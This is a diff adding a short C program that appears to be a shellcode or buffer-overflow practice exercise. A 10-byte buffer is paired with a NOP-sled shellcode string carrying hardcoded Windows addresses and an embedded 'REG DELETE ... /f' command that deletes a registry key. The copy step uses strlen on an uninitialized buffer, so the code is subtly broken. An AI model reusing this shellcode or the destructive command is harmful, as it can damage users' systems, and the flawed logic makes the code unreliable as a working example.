@@ -1,0 +1,13 @@
+#define _CRT_SECURE_NO_WARNINGS
+#include <stdio.h>
+#include <string.h>
+
+int main() {
+
+    char buf[10];
+    char shell[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x61\x46\xF0\x76\xEB\x10\x5B\x53\xB9\x20\xCF\x6F\x76\xFF\xD1\x50\x46\x6C\x76\xFF\xD3\xE8\xEB\xFF\xFF\xFFREG DELETE HKEY_CURRENT_USER\\test\\delete /f\"";
+    strncpy(buf, shell, strlen(buf));
+    printf("%s\n", buf);
+
+    return 0;
+}
